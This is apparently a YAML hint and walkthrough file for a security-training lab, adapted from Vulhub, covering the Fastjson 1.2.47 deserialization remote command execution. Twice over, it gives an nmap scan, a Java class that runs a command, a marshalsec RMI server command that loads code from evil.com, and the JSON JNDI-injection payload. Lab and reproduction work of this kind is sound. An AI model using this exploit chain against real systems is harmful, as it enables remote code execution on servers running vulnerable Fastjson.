# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
schema_version: 1
match: fastjson/1.2.47-rce
hint_levels:
  low:
  - Inspect the fastjson service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8090. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8090 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8090/tcp → container 8090/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8090`.'
  high:
  - 'Vulnerability: Fastjson 1.2.47 Deserialization Remote Command Execution.'
  - |-
    Vulnerability Reproduction

    The target environment is `openjdk:8u102`, which doesn't have the `com.sun.jndi.rmi.object.trustURLCodebase` restriction. We can easily execute commands using RMI.

    First, compile and upload the command execution code, such as `http://evil.com/TouchFile.class`:

    ```java
    // javac TouchFile.java
    import java.lang.Runtime;
    import java.lang.Process;

    public class TouchFile {
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/success"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    }
    ```

    Then, using the marshalsec: https://github.com/mbechler/marshalsec project, start an RMI server listening on port 9999 and specify loading the remote class `TouchFile.class`:

    ```shell
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
    ```

    Send the payload to the target server:

    ```
    {
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://evil.com:9999/Exploit",
            "autoCommit":true
        }
    }
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/1.png

    As shown below, the command `touch /tmp/success` has been successfully executed:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/2.png

    For more exploitation methods, please refer to JNDI injection related knowledge.
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/README.md'
  - |-
    Additional public references:
    - https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
    - https://www.freebuf.com/vuls/208339.html
access_instructions:
  title: Fastjson 1.2.47 Deserialization Remote Command Execution
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8090. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8090 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 8090/tcp → container 8090/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8090`.
  - title: Vulnerability Reproduction
    instructions: |-
      The target environment is `openjdk:8u102`, which doesn't have the `com.sun.jndi.rmi.object.trustURLCodebase` restriction. We can easily execute commands using RMI.

      First, compile and upload the command execution code, such as `http://evil.com/TouchFile.class`:

      ```java
      // javac TouchFile.java
      import java.lang.Runtime;
      import java.lang.Process;

      public class TouchFile {
          static {
              try {
                  Runtime rt = Runtime.getRuntime();
                  String[] commands = {"touch", "/tmp/success"};
                  Process pc = rt.exec(commands);
                  pc.waitFor();
              } catch (Exception e) {
                  // do nothing
              }
          }
      }
      ```

      Then, using the marshalsec: https://github.com/mbechler/marshalsec project, start an RMI server listening on port 9999 and specify loading the remote class `TouchFile.class`:

      ```shell
      java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
      ```

      Send the payload to the target server:

      ```
      {
          "a":{
              "@type":"java.lang.Class",
              "val":"com.sun.rowset.JdbcRowSetImpl"
          },
          "b":{
              "@type":"com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName":"rmi://evil.com:9999/Exploit",
              "autoCommit":true
          }
      }
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/1.png

      As shown below, the command `touch /tmp/success` has been successfully executed:

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/2.png

      For more exploitation methods, please refer to JNDI injection related knowledge.
guidance_source:
  repository: https://github.com/vulhub/vulhub
  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.47-rce/README.md
  readme_sha256: 60f274a6bd10bd05fa4f7d14147bebc8d69f64e7ed9e5c9f46464f5f79426bfe
  compose_sha256: c8cd93d7af47869a1477d9453dd6c388d9569652a7ea3358b8cad99f9b031f01
  license: MIT; see vulnhub/content/LICENSE
  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
    have not been executed.
